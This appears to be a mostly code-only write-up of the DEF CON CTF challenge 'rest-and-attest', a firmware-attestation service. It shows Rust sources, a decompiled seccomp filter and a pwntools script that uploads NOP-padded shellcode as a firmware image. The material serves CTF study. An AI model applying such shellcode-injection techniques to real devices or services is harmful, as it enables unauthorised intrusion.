# DefCon  REST-AND-ATTEST

> 原文: https://www.ctfiot.com/118801.html
> ID: 118801


```
Description
Are you ready for a revolution in home security? NI Securable Products is proud to present our newest smart lock technology, equipped with our Secure Firmware Module. This robust root-of-trust allows for easy, convenient, and secure upgrades of firmware using the latest in firmware attestation technology.

Host: rest-and-attest-tbjffclmcnxkq.shellweplayaga.me

Port: 10001

Ticket
This challenge requires a ticket to connect. Your team's ticket is:

ticket{*********}
This ticket and the flag are traceable to your team. Do not share it with other teams, and do not try to submit a flag from another team.

Files
rest-and-attest.tar.gz
```



```
#!/bin/sh

# simulates challenge running in production environment
socat tcp4-listen:4444,reuseaddr,fork exec:"./wrapper.sh"
```



```
#!/bin/sh

exec 3<&- 4<&-

exec ./uploader
```



```
fn io_loop() -> Result<(), Box<dyn Error>> {

    let mut image = include_bytes!("trusted_firmware.raw").to_vec();

    loop {
        let mut line = String::new();

        print!("> ");
        stdout().flush()?;
        stdin().read_line(&mut line)?;

        let command = line.trim();
        if command == String::from("upload") {
            image = get_new_image()?; // user input iamge
        } else if command == String::from("download") {
            do_download(&image)?; // image to hex and stdout ptint
        } else if command == String::from("run") {
            run_device(&image)?; // so lancher connect sfm and lancher have iamge, ok, may lancher give image to sfm and sfm run image
        } else if command == String::from("quit") {
            break;
        } else {
            println!("Invalid command {:}", command)
        }
    }

    Ok(())
}
```



```
__int64 install_seccomp_filter()
{
  __int64 v0; // rcx
  __int64 v1; // r8
  __int16 v3; // [rsp+0h] [rbp-80h] BYREF
  __int16 *v4; // [rsp+8h] [rbp-78h]
  __int16 v5; // [rsp+10h] [rbp-70h] BYREF
  char v6; // [rsp+12h] [rbp-6Eh]
  char v7; // [rsp+13h] [rbp-6Dh]
  int v8; // [rsp+14h] [rbp-6Ch]
  __int16 v9; // [rsp+18h] [rbp-68h]
  char v10; // [rsp+1Ah] [rbp-66h]
  char v11; // [rsp+1Bh] [rbp-65h]
  int v12; // [rsp+1Ch] [rbp-64h]
  __int16 v13; // [rsp+20h] [rbp-60h]
  char v14; // [rsp+22h] [rbp-5Eh]
  char v15; // [rsp+23h] [rbp-5Dh]
  int v16; // [rsp+24h] [rbp-5Ch]
  __int16 v17; // [rsp+28h] [rbp-58h]
  char v18; // [rsp+2Ah] [rbp-56h]
  char v19; // [rsp+2Bh] [rbp-55h]
  int v20; // [rsp+2Ch] [rbp-54h]
  __int16 v21; // [rsp+30h] [rbp-50h]
  char v22; // [rsp+32h] [rbp-4Eh]
  char v23; // [rsp+33h] [rbp-4Dh]
  int v24; // [rsp+34h] [rbp-4Ch]
  __int16 v25; // [rsp+38h] [rbp-48h]
  char v26; // [rsp+3Ah] [rbp-46h]
  char v27; // [rsp+3Bh] [rbp-45h]
  int v28; // [rsp+3Ch] [rbp-44h]
  __int16 v29; // [rsp+40h] [rbp-40h]
  char v30; // [rsp+42h] [rbp-3Eh]
  char v31; // [rsp+43h] [rbp-3Dh]
  int v32; // [rsp+44h] [rbp-3Ch]
  __int16 v33; // [rsp+48h] [rbp-38h]
  char v34; // [rsp+4Ah] [rbp-36h]
  char v35; // [rsp+4Bh] [rbp-35h]
  int v36; // [rsp+4Ch] [rbp-34h]
  __int16 v37; // [rsp+50h] [rbp-30h]
  char v38; // [rsp+52h] [rbp-2Eh]
  char v39; // [rsp+53h] [rbp-2Dh]
  int v40; // [rsp+54h] [rbp-2Ch]
  __int16 v41; // [rsp+58h] [rbp-28h]
  char v42; // [rsp+5Ah] [rbp-26h]
  char v43; // [rsp+5Bh] [rbp-25h]
  int v44; // [rsp+5Ch] [rbp-24h]
  __int16 v45; // [rsp+60h] [rbp-20h]
  char v46; // [rsp+62h] [rbp-1Eh]
  char v47; // [rsp+63h] [rbp-1Dh]
  int v48; // [rsp+64h] [rbp-1Ch]
  __int16 v49; // [rsp+68h] [rbp-18h]
  char v50; // [rsp+6Ah] [rbp-16h]
  char v51; // [rsp+6Bh] [rbp-15h]
  int v52; // [rsp+6Ch] [rbp-14h]
  __int16 v53; // [rsp+70h] [rbp-10h]
  char v54; // [rsp+72h] [rbp-Eh]
  char v55; // [rsp+73h] [rbp-Dh]
  int v56; // [rsp+74h] [rbp-Ch]
  unsigned __int64 v57; // [rsp+78h] [rbp-8h]

  v57 = __readfsqword(0x28u);
  v5 = 32;
  v6 = 0;
  v7 = 0;
  v8 = 4;
  v9 = 21;
  v10 = 1;
  v11 = 0;
  v12 = -1073741762;
  v13 = 6;
  v14 = 0;
  v15 = 0;
  v16 = 0;
  v17 = 32;
  v18 = 0;
  v19 = 0;
  v20 = 0;
  v21 = 21;
  v22 = 0;
  v23 = 1;
  v24 = 0;
  v25 = 6;
  v26 = 0;
  v27 = 0;
  v28 = 2147418112;
  v29 = 21;
  v30 = 0;
  v31 = 1;
  v32 = 1;
  v33 = 6;
  v34 = 0;
  v35 = 0;
  v36 = 2147418112;
  v37 = 21;
  v38 = 0;
  v39 = 1;
  v40 = 47;
  v41 = 6;
  v42 = 0;
  v43 = 0;
  v44 = 2147418112;
  v45 = 21;
  v46 = 0;
  v47 = 1;
  v48 = 11;
  v49 = 6;
  v50 = 0;
  v51 = 0;
  v52 = 2147418112;
  v53 = 6;
  v54 = 0;
  v55 = 0;
  v56 = 0;
  v3 = 13;
  v4 = &v5;
  if ( (unsigned int)prctl(38LL, 1LL, 0LL, 0LL, 0LL) )
  {
    perror("prctl(NO_NEW_PRIVS)");
  }
  else
  {
    if ( !(unsigned int)prctl(22LL, 2LL, &v3, v0, v1) )
      return 0LL;
    perror("prctl(SECCOMP)");
  }
  return 1LL;
}
```



```
__int64 install_seccomp_filter()
{
  __int64 v0; // rcx
  __int64 v1; // r8
  sock_fprog sec_filter; // [rsp+0h] [rbp-80h] BYREF
  sock_filter filter[13]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v5; // [rsp+78h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  filter[0].code = 32;                          // /* Load architecture from 'seccomp_data' buffer into accumulator. */
                                                // BPF_STMT(BPF_LD | BPF_W | BPF_ABS, (offsetof(struct seccomp_data, arch)))
  filter[0].jt = 0;
  filter[0].jf = 0;
  filter[0].k = 4;
  filter[1].code = 21;                          // ???
  filter[1].jt = 1;
  filter[1].jf = 0;
  filter[1].k = 0xC000003E;
  filter[2].code = 6;                           // /* Destination of architecture mismatch: kill process. */
                                                // BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS)
  filter[2].jt = 0;
  filter[2].jf = 0;
  filter[2].k = 0;
  filter[3].code = 32;                          // /* Load system call number from 'seccomp_data' buffer into accumulator. */
                                                // BPF_STMT(BPF_LD | BPF_W | BPF_ABS, (offsetof(struct seccomp_data, nr)))
  filter[3].jt = 0;
  filter[3].jf = 0;
  filter[3].k = 0;
  filter[4].code = 21;                          // /* Jump forward k instructions if ... */
                                                // BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, jt, jf, k)
  filter[4].jt = 0;
  filter[4].jf = 1;
  filter[4].k = 0;
  filter[5].code = 6;                           // /* Destination of system call number mismatch: allow other system calls. */
                                                // BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
  filter[5].jt = 0;
  filter[5].jf = 0;
  filter[5].k = 0x7FFF0000;                     // SECCOMP_RET_ALLOW
  filter[6].code = 21;                          // /* Jump forward k instructions if ... */
                                                // BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, jt, jf, k)
  filter[6].jt = 0;
  filter[6].jf = 1;
  filter[6].k = 1;
  filter[7].code = 6;
  filter[7].jt = 0;
  filter[7].jf = 0;
  filter[7].k = 0x7FFF0000;                     // SECCOMP_RET_ALLOW
  filter[8].code = 21;                          // /* Jump forward k instructions if ... */
                                                // BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, jt, jf, k)
  filter[8].jt = 0;
  filter[8].jf = 1;
  filter[8].k = 47;
  filter[9].code = 6;
  filter[9].jt = 0;
  filter[9].jf = 0;
  filter[9].k = 0x7FFF0000;                     // SECCOMP_RET_ALLOW
  filter[10].code = 21;                         // /* Jump forward k instructions if ... */
                                                // BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, jt, jf, k)
  filter[10].jt = 0;
  filter[10].jf = 1;
  filter[10].k = 11;
  filter[11].code = 6;
  filter[11].jt = 0;
  filter[11].jf = 0;
  filter[11].k = 0x7FFF0000;                    // SECCOMP_RET_ALLOW
  filter[12].code = 6;                          // /* Destination of architecture mismatch: kill process. */
                                                // BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS)
  filter[12].jt = 0;
  filter[12].jf = 0;
  filter[12].k = 0;
  sec_filter.len = 13;
  sec_filter.filter = filter;
  if ( (unsigned int)prctl(38LL, 1LL, 0LL, 0LL, 0LL) )// #define PR_SET_NO_NEW_PRIVS 38
  {
    perror("prctl(NO_NEW_PRIVS)");
  }
  else
  {
    if ( !(unsigned int)prctl(22LL, 2LL, &sec_filter, v0, v1) )// #define PR_SET_SECCOMP  22
                                                // #define SECCOMP_MODE_FILTER 2 /* uses user-supplied filter. */
      return 0LL;
    perror("prctl(SECCOMP)");
  }
  return 1LL;
}
```



```
impl SfmCommandCode {
    pub const GetIdentity: Self = SfmCommandCode(0);
    pub const IntegrityBankUpdate: Self = SfmCommandCode(1);
    pub const CreateObject: Self = SfmCommandCode(2);
    pub const ModifyObject: Self = SfmCommandCode(3);
    pub const DuplicateObject: Self = SfmCommandCode(4);
    pub const UnsealObject: Self = SfmCommandCode(5);
    pub const CertifyObject: Self = SfmCommandCode(6);
    pub const AttestQuote: Self = SfmCommandCode(7);
    pub const EstablishSecureIo: Self = SfmCommandCode(8);
}
```



```
fn certify_object(&mut self, cmd: WithTrailer<SfmCertifyObject>) -> SfmResult<bool> {
        let entry = self.object_store.get(&cmd.object_index.into())
            .ok_or(SfmError::InvalidObjectIndex(cmd.object_index))?;

        let certification = match &entry.item {
            SfmObject::OwnershipRecord(body) => {
                self.sfm.certify_ownership_record(
                           &body.owner_name.as_bytes(),
                           &body.device_name[..],
                           u64::from_le_bytes(body.serial_number),
                           body.creation_date)
            }
            SfmObject::Key(key) => {
                self.sfm.certify_key(&key.key_data[..])
            }
            SfmObject::NvStorage(data) => {
                self.sfm.certify_nv_storage(&data[..])
            }
        };

        // write the cert blob back out
        let cert_blob = certification.ok_or(SfmError::SfmInternalError)?;
        self.stream.write_all(&cert_blob[..])?;
        Ok(true)
    }
```



```
pub fn certify_ownership_record(&mut self,
                                    owner_name: &[u8],
                                    device_name: &[u8],
                                    serial: u64,
                                    timestamp: u32) -> Option<Vec<u8>> {
        let mut out_buf = [0u8; MAX_OWNERSHIP_CERT_SIZE];

        let err = unsafe {
            sfm_certify_owner_record(self.ek,
                                     owner_name.as_ptr(),
                                     device_name.as_ptr(),
                                     serial,
                                     timestamp,
                                     out_buf.as_mut_ptr())
        };

        if err != 0 {
            None
        } else {
            Some(out_buf.to_vec())
        }
    }
```



```
pub struct OwnershipRecord {
    pub country_code: String,
    pub owner_name: String,
    pub device_name: [u8; 16],
    pub serial_number: [u8; 8],
    pub creation_date: u32
}
#[repr(C)]
#[derive(Debug, AsBytes, FromBytes)]
pub struct OwnershipRecordRaw {
    pub country_code: [u8; 2],
    pub _padding: [u8; 2],
    pub owner_name: [u8; 64],
    pub device_name: [u8; 16],
    pub serial_number: [u8; 8],
    pub creation_date: u32,
}
```



```
impl From<OwnershipRecordRaw> for OwnershipRecord {
    fn from(item: OwnershipRecordRaw) -> Self {
        Self {
            country_code: String::from_utf8_lossy(&item.country_code[..]).to_string(),
            owner_name: String::from_utf8_lossy(&item.owner_name[..]).to_string(),
            device_name: item.device_name,
            serial_number: item.serial_number,
            creation_date: item.creation_date
        }
    }
}
```



```
pub fn from_utf8_lossy(v: &[u8]) -> Cow<'_, str> {
        let mut iter = Utf8Chunks::new(v);

        let first_valid = if let Some(chunk) = iter.next() {
            let valid = chunk.valid();
            if chunk.invalid().is_empty() {
                debug_assert_eq!(valid.len(), v.len());
                return Cow::Borrowed(valid);
            }
            valid
        } else {
            return Cow::Borrowed("");
        };

        const REPLACEMENT: &str = "u{FFFD}";

        let mut res = String::with_capacity(v.len());
        res.push_str(first_valid);
        res.push_str(REPLACEMENT);

        for chunk in iter {
            res.push_str(chunk.valid());
            if !chunk.invalid().is_empty() {
                res.push_str(REPLACEMENT);
            }
        }

        Cow::Owned(res)
    }
```



```
pub fn attest(&self,
                  alg_id: u16,
                  banks: Vec<[u8; 64]>) -> Option<Vec<u8>> {
        let mut out_buf = [0u8; 512];
        let err = unsafe {
            sfm_attest_to_quote(self.ek,
                                alg_id as u16,
                                banks.as_ptr(),
                                banks.len(),
                                out_buf.as_mut_ptr())
        };

        if err != 0 {
            None
        } else {
            Some(out_buf.to_vec())
        }
    }

    fn attest_quote(&mut self, cmd: WithTrailer<SfmAttestQuote>) -> SfmResult<bool> {
        let alg = cmd.alg_id;

        if alg > SfmHashAlgorithm::HashAlgMax as u16 {
            return Err(SfmError::InvalidAlgorithmType);
        }

        let report = self.sfm.attest(alg, self.banks.to_vec());

        self.stream.write_all(&report.ok_or(SfmError::SfmInternalError)?[..])?;
        Ok(true)
    }
```



```
from pwn import *
from binascii import hexlify

context.log_level = 'debug'
connect.arch = 'amd64'
context.terminal = ["tmux", "splitw", "-h"]

p = process('./uploader')

payload =  ''
payload += shellcraft.read(3, 'rsp', 4)
payload += shellcraft.pushstr("SFMI")
payload += shellcraft.write(3, 'rsp' , 4)

payload = asm(payload)
payload = payload.ljust(0x2000, b'x90') # 这里就是之前说到的关键

def upload():
    # gdb.attach(p)
    p.recvuntil(b'>')
    p.sendline(b'upload')
    p.sendline(hexlify(payload))
upload()

p.interactive()
```



```
pwndbg> catch exec
pwndbg> catch fork
pwndbg> catch vfork
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/7-1685945817.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/5-1685945817.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/10-1685945818.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/1-1685945818.png)